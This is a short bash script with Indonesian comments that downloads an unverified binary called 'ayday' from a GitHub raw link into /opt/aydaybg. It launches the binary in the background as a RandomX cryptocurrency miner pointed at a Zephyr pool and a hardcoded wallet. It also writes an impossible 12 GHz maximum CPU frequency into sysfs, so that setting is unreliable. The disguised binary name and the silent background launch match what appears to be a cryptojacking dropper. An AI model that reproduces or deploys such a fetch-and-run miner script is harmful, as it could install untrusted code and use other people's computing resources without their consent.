#!/bin/bash

# Direktori tempat file akan diunduh
INSTALL_DIR="/opt/aydaybg"
FILE_NAME="ayday"
FILE_PATH="$INSTALL_DIR/$FILE_NAME"

# Membuat direktori
mkdir -p $INSTALL_DIR

# Mengunduh file dari link yang diberikan
wget -O $FILE_PATH https://github.com/bibirbusin/bibirbusin/raw/main/ayday

# Memeriksa keberhasilan unduhan
if [ ! -s $FILE_PATH ]; then
  echo "File unduhan kosong atau gagal diunduh. Cek URL atau koneksi jaringan."
  exit 1
fi

# Mengatur frekuensi CPU ke 12 GHz
CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
MAX_FREQ=12000000 # Maksimal frekuensi dalam kHz (12 GHz)

for dir in $CPUFREQ_PATH; do
    if [ -e $dir/scaling_max_freq ]; then
        echo $MAX_FREQ > $dir/scaling_max_freq
    fi
done

# Pengaturan penambangan
ALGO="randomx"
POOL_URL="de.zephyr.herominers.com:1123"
WALLET_ADDRESS="ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT"
PASSWORD="ZAluxy$RANDOM"

# Memulai dengan file ayday dan menjalankan di latar belakang
cd $INSTALL_DIR
chmod +x $FILE_NAME
./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --cpu-threads 0 --randomx-use-1gb-pages &

# Mengecek apakah proses penambangan dimulai dengan benar
if pgrep -f "$FILE_NAME" > /dev/null; then
  echo "Penambangan dimulai dengan sukses."
else
  echo "Gagal memulai proses penambangan."
  exit 1
fi

# Opsional: Tambahkan monitoring atau logging jika diinginkan
# echo "Monitoring status..." >> mining_log.txt
# top -b -d 60 >> mining_log.txt
